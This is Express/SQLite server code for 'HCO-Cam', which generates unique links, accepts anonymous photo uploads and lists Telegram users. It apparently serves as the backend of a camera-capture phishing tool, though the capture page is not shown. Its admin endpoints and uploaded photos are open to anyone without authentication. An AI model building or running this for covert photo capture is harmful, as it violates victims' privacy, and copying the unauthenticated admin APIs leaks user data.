const express = require("express");
const multer = require("multer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const sqlite3 = require("sqlite3").verbose();
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

/* =========================
   DATABASE
========================= */
const db = new sqlite3.Database("./data.db");

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id TEXT UNIQUE,
      joined_at TEXT
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      filename TEXT,
      uploaded_at TEXT
    )
  `);
});

/* =========================
   MIDDLEWARE
========================= */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

/* =========================
   UPLOAD CONFIG
========================= */
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/");
  },
  filename: (req, file, cb) => {
    cb(null, uuidv4() + ".jpg");
  }
});

const upload = multer({ storage });

/* =========================
   ROUTES
========================= */

// Home
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

// Register Telegram user
app.post("/api/register", (req, res) => {
  const { telegram_id } = req.body;
  if (!telegram_id) return res.sendStatus(400);

  db.run(
    `INSERT OR IGNORE INTO users (telegram_id, joined_at)
     VALUES (?, datetime('now'))`,
    [telegram_id]
  );

  res.json({ success: true });
});

// Generate unique link  ✅ FIXED
app.post("/api/generate", (req, res) => {
  const id = uuidv4();

  const protocol = req.headers["x-forwarded-proto"] || "https";
  const host = req.headers.host;

  res.json({
    link: `${protocol}://${host}/?id=${id}`
  });
});

// Upload photo
app.post("/api/upload", upload.single("photo"), (req, res) => {
  if (!req.file) return res.sendStatus(400);

  db.run(
    `INSERT INTO photos (filename, uploaded_at)
     VALUES (?, datetime('now'))`,
    [req.file.filename]
  );

  res.json({ success: true });
});

/* =========================
   ADMIN APIs
========================= */

// Stats
app.get("/api/admin/stats", (req, res) => {
  db.get(`SELECT COUNT(*) AS users FROM users`, (err, u) => {
    if (err) return res.sendStatus(500);

    db.get(`SELECT COUNT(*) AS photos FROM photos`, (err2, p) => {
      if (err2) return res.sendStatus(500);

      res.json({
        users: u.users,
        photos: p.photos
      });
    });
  });
});

// User list
app.get("/api/admin/users", (req, res) => {
  db.all(
    `SELECT telegram_id, joined_at
     FROM users
     ORDER BY id DESC`,
    (err, rows) => {
      if (err) return res.sendStatus(500);
      res.json(rows);
    }
  );
});

/* =========================
   START SERVER
========================= */
app.listen(PORT, () => {
  console.log(`
🚀📸 HCO-Cam Server Started!
============================
🌐 Local/Render Port: ${PORT}
📊 Stats API: /api/admin/stats
👥 Users API: /api/admin/users
📁 Uploads: /uploads
🤖 Telegram Bot runs separately
============================
`);
});
